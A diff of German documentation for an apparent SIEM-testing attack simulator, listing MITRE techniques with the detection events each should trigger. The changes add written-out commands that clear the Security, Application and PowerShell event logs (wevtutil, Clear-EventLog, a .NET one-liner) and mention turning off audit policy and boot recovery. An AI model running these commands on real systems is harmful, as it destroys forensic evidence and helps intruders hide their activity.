-**Warum das Angreifer tun:** Durch Deaktivierung der Auditierung werden keine Event-4624/4625-Einträge für nachfolgende Aktionen generiert. Event 4719 ("System audit policy was changed") ist das Erkennungssignal — ironischerweise kann ein Angreifer dieses Signal durch schnelle Aktivitäten zwischen Policy-Änderung und Wiederherstellung minimieren.
+**Warum das Angreifer tun:** Durch mehrstufige Logging-Deaktivierung werden EID 4624/4625 (Logon-Events), EID 4688 (Prozesserstellung) und Sysmon-Events für nachfolgende Aktionen unterdrückt. Event 4719 ("System audit policy was changed") ist das Erkennungssignal — es feuert für jede `auditpol`-Änderung. Die wevtutil-Kanal-Deaktivierung testet, ob das SIEM fehlende Logs bemerkt.
 
 **Erwartete SIEM-Events:**
-- `4719` — "System audit policy was changed" — **das Erkennungssignal**
+- `4719` — "System audit policy was changed" — **für jede auditpol-Subcategory-Änderung**
+- `4688` — `auditpol.exe`, `wevtutil.exe` Prozesserstellung
+- `Sysmon 13` — RegistryValueSet: EventLog MaxSize-Reduktion
 
 ---
 
@@ -1552,18 +1676,27 @@ auditpol /set /subcategory:"Logon" /success:enable /failure:enable
 
 **Was wird ausgeführt:**
 
-```cmd
-# Nur das Application-Log wird geleert (kein Security-Log)
-# Ein echter Angreifer würde wevtutil cl Security ausführen
-wevtutil cl Application
+```powershell
+# Method 1: wevtutil cl — kanonische Log-Löschung
+wevtutil.exe cl Application          # System EID 104 (Application log cleared)
+wevtutil.exe cl "Windows PowerShell" # System EID 104 (PS log cleared)
+wevtutil.exe cl Security             # Security EID 1102 (Security log cleared)
+# Kritisch: EID 1102 wird BEVOR der Log gelöscht wird geschrieben — es überlebt immer
+
+# Method 2: PowerShell Clear-EventLog (testet PS-Cmdlet-Erkennung, anders als wevtutil)
+Clear-EventLog -LogName "System"
+
+# Method 3: .NET EventLog.Clear() (umgeht Clear-EventLog-Cmdlet — testet Event-Log-Only-Detektion)
+[System.Diagnostics.EventLog]::GetEventLogs() | Where-Object { $_.Log -match "Application|Setup" } | ForEach-Object { $_.Clear() }
 ```
 
-**Warum das Angreifer tun:** Nach einer Kompromittierung versuchen Angreifer, Spuren zu verwischen, indem sie Event-Logs löschen. Event 1102 (Audit Log Cleared) und `wevtutil cl` mit dem Security-Log-Argument sind direkte IOCs. **Das Security-Log wird von LogNoJutsu bewusst nicht gelöscht**, um die forensische Integrität der Simulation zu bewahren.
+**Warum das Angreifer tun:** Nach einer Kompromittierung versuchen Angreifer, Spuren zu verwischen. `wevtutil cl Security` ist ein direkter IOC. **Entscheidend:** EID 1102 wird vom Windows-Event-System erzeugt, BEVOR der Security-Log-Inhalt tatsächlich gelöscht wird — es überlebt daher immer die Log-Löschung und ist einer der hochwertigsten Attacker-Indikatoren. Die drei Methoden (wevtutil, PS-Cmdlet, .NET-direkt) testen alle Erkennungsebenen.
 
 **Erwartete SIEM-Events:**
-- `4688` — `wevtutil.exe` mit `cl` Argument
-- `Sysmon 1` — `wevtutil.exe cl Application`
-- `1102` — Audit log cleared (nur wenn Security-Log geleert)
+- `1102` — Security Audit Log Cleared — **EID wird vor dem Clear geschrieben, überlebt immer**
+- `System 104` — Event log cleared (Application, System, Windows PowerShell)
+- `4688` — `wevtutil.exe` mit `cl`-Subkommando
+- `4104` — ScriptBlock-Log: `Clear-EventLog` und `.NET EventLog.Clear()`
 
 ---
 
@@ -1866,9 +1999,10 @@ Zusätzlich wird `lognojutsu_report_YYYYMMDD_HHMMSS.json` erstellt:
 | T1548.002 | Registry-Key `HKCU\Software\Classes\mscfile\...` | Registry-Tree entfernt |
 | T1197 | BITS-Job `LogNoJutsu_BITS_Test` | Job abgebrochen |
 | T1546.003 | WMI Filter, Consumer, Binding | Alle drei WMI-Objekte entfernt |
-| T1036.005 | Temporäre Binärdateien in `%TEMP%\LogNoJutsu_Masq\` | Verzeichnis entfernt |
-| T1486 | Simuliertes Ransomware-Verzeichnis `%TEMP%\LogNoJutsu_RansomSim\` | Verzeichnis entfernt |
-| T1562.002 | Logon-Auditierung deaktiviert | Auditierung wiederhergestellt |
+| T1036.005 | Temporäre Binärdateien in `%TEMP%\LNJ_Masq\` + Run-Key | Verzeichnis + Registry entfernt |
+| T1486 | AES-verschlüsselte Dateien + Ransom-Note in `%TEMP%\LNJ_T1486\` | Verzeichnis entfernt |
+| T1490 | Boot-Recovery deaktiviert, SystemRestore-Registry | bcdedit wiederhergestellt, Keys entfernt |
+| T1562.002 | Audit-Policy deaktiviert, wevtutil Kanäle, MaxSize-Registry | Backup-Restore + Kanäle reaktiviert |
 | T1550.002 | Netzwerkverbindungen via `net use` | `net use * /delete` |
 
 ### Cleanup-Modi
